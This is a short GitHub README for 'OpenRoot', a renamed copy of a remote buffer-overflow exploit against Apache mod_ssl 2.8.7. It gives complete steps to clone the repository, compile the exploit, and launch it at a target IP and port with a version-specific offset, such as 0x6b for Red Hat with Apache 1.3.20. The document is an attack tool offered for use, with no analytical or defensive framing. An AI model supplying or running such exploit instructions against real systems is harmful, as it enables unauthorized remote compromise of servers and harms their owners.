# Apache_mod_ssl-_2.8.7-_Remote-Buffer-Overflow
# OpenRoot
Original is OpenFu*&%$#, I change for something more elegant

## Usage

1. Download OpenRoot.c
```
git clone https://github.com/rony926/Apache_mod_ssl-_2.8.7-_Remote-Buffer-Overflow.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

````
gcc -o OpenRoot OpenRoot.c -lcrypto
````

4. Running the Exploit
```
./OpenRoot
```

5. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6b option
./OpenRoot 0x6b [Target Ip] [port] -c 40

for example:
```
./OpenRoot 0x6b 192.168.80.145 443 -c 40
```
